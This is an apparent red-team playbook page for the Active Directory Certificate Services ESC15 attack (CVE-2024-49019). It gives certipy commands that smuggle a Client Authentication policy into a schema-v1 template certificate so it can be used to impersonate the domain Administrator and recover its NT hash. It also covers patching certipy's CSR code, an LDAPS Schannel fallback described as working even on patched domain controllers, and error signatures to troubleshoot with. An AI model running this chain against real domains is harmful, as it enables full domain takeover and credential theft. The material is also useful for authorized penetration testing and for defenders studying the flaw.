# ADCS ESC15 — Schema v1 + EnrolleeSuppliesSubject + App-Policy Smuggling (CVE-2024-49019)

## When this applies

- AD CS template with `msPKI-Template-Schema-Version = 1` AND `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (typically `WebServer`, `Web Server`, custom v1 templates that issue `Server Authentication` certs).
- You can enroll for the template (directly, or via a user you control after a privilege chain).
- Target DC is **unpatched** (cumulative update older than November 2024). See "Patched-KDC failure signature" below.

`certipy find -vulnerable` flags this as `ESC15: Enrollee supplies subject and schema version is 1`.

## Technique

The CSR's `extensionRequest` PKCS#10 attribute carries a Microsoft Application Policies extension (OID `1.3.6.1.4.1.311.21.10`). On schema-v1 templates, the CA copies the extension verbatim into the issued cert. Pre-Nov-2024, the KDC validates Application Policies for PKINIT — so smuggling `1.3.6.1.5.5.7.3.2` (Client Authentication) into a Server-Authentication-only template gets you a usable client-auth cert with arbitrary UPN.

## Steps

```bash
# 1. Enrol with -application-policies — adds the smuggled OID into the CSR extensionRequest.
certipy req -u <ENROLLER>@<DOMAIN> -p <PASS> -target <DC_FQDN> \
            -ca '<CA_NAME>' \
            -template <SCHEMA_V1_TEMPLATE> \
            -upn 'Administrator@<DOMAIN>' \
            -sid '<ADMIN_SID>' \
            -application-policies 'Client Authentication' \
            -out admin

# 2. PKINIT — gets a TGT for Administrator@<DOMAIN>, returns NT hash.
certipy auth -pfx admin.pfx -dc-ip <DC_IP> -username Administrator -domain <DOMAIN>
```

Always pass `-sid <SID>` alongside `-upn` — post-CVE-2022-26931 KDCs require strong cert mapping (SID extension), and the `-application-policies` smuggling does not change that requirement.

## Pre-flight: certipy 5.0.4 CSR bug

certipy 5.0.4's `create_csr` adds the Microsoft Application Policies extension as a **second separate `extensionRequest` attribute** (after the SAN attribute). AD CS only processes the first `extensionRequest` attribute, silently dropping the App Policies. The issued cert comes back with `Microsoft Application Policies Extension: <empty SEQUENCE>` and PKINIT fails with `INCONSISTENT_KEY_PURPOSE` *even on unpatched DCs*.

**Detect**: parse the issued PFX with the `cryptography` library and inspect the OID `1.3.6.1.4.1.311.21.10` extension value — if it's `b'0\x00'` (empty SEQUENCE), the smuggling didn't take.

**Fix**: patch `certipy/lib/certificate.py::create_csr` to merge all sub-extensions into a *single* `extensionRequest` attribute. Collect Extension objects (SAN, SecurityExt/SID, Application Policies) into one list, then emit:

```python
cri_attributes.append(asn1csr.CRIAttribute({
    "type": "extension_request",
    "values": asn1csr.SetOfExtensions([all_extensions_list]),
}))
```

Don't forget `find -name __pycache__ -exec rm -rf {} +` afterwards or the old bytecode wins. Verify the patched CSR with `asn1crypto.csr.CertificationRequest.load(der)` — should show one `extension_request` containing both SAN + App Policies.

## Patched-KDC failure signature

If, after the cert is correctly issued (the App Policies extension contains `1.3.6.1.5.5.7.3.2`), `certipy auth` still returns:

```
[-] Certificate is not valid for client authentication
    KDC_ERR_INCONSISTENT_KEY_PURPOSE
```

then the DC has the **November-2024+ cumulative update** that closes CVE-2024-49019. The KDC now validates the standard X.509 Extended Key Usage and ignores the Microsoft Application Policies extension. No amount of `-application-policies` / `-sid` / Smart Card Logon OID combinations recovers ESC15 over PKINIT once the DC is patched.

### Schannel LDAPS fallback works on patched DCs (verified)

Despite earlier guidance to skip it, **Schannel-via-`certipy auth -ldap-shell` succeeds against a patched DC** when the issued cert has Server Auth EKU and an Application Policies extension containing Client Auth (the typical ESC15 output). Confirmed against a Windows Server 2019 Build 17763 DC running the WebServer template:

```
[*] Connecting to 'ldaps://<DC>:636'
[*] Authenticated to '<DC_IP>' as: 'u:<DOMAIN>\\Administrator'
```

Why: AD's Schannel binding (certipy 5.x's `schannel_connect`) uses SASL/EXTERNAL over the TLS-cert-presenting socket. AD does NOT enable SASL EXTERNAL on plain LDAP, but it DOES accept implicit cert-mapping over LDAPS:636 when the TLS handshake presents a client cert whose SAN UPN maps to a domain user. The KDC patch is PKINIT-specific and does not affect Schannel cert mapping.

Two macOS-specific gotchas when reproducing this with certipy 5.x:

1. **OpenSSL 3.6 + SHA1-signed CA chain** triggers `CA_MD_TOO_WEAK` on TLS handshake. Setting `ciphers='ALL:@SECLEVEL=0'` is necessary but must run **before** `load_cert_chain`. ldap3 4.x does it in the wrong order — patch `ldap3/core/tls.py::Tls.wrap_socket` to move the cipher/option setup ahead of `load_cert_chain`.

2. **certipy 5.x requires Python 3.12.** A 3.11 venv stays on certipy 4.8.2, which lacks `-application-policies` entirely. Use `/opt/homebrew/bin/python3.12 -m venv /tmp/certipy5 && /tmp/certipy5/bin/pip install certipy-ad`.

Pivot to ESC1/ESC4/ESC9/ESC16 only when LDAPS:636 is firewalled, when the cert has no Application Policies extension at all, or when the cert lacks any client-auth-capable OID (e.g., template only granted Code Signing).

## Common pitfalls

- Forgetting to set `userAccountControl` to remove `ACCOUNTDISABLE` after restoring an enroller from the AD Recycle Bin (see [acl-abuse-chains.md](acl-abuse-chains.md) for the restore recipe). `certipy req` then fails with `rpc_s_access_denied` at the RPC layer rather than a useful "account disabled" message.
- Skipping the `-sid` argument on a strong-mapping DC — even unpatched ESC15 fails with `STRONG_KEY_AUTH_REQUIRED`-style errors.
- Reading the openssl text dump and concluding "App Policies is empty" when openssl is just truncating the display. Always parse with `cryptography.x509` and print `ext.value.value.hex()` for the OID 1.3.6.1.4.1.311.21.10 extension.

## Cross-references

- ESC1/ESC4/ESC9/ESC16: [adcs-esc1.md](adcs-esc1.md), [adcs-esc4.md](adcs-esc4.md), [adcs-esc16.md](adcs-esc16.md)
- AD Recycle Bin "restore" via combined LDAP modify (when the enroller was deleted): [acl-abuse-chains.md](acl-abuse-chains.md)
- Schannel-based fallback when PKINIT fails for OTHER reasons (e.g., NTLM disabled): [certipy-ldap-shell-fallback.md](certipy-ldap-shell-fallback.md)
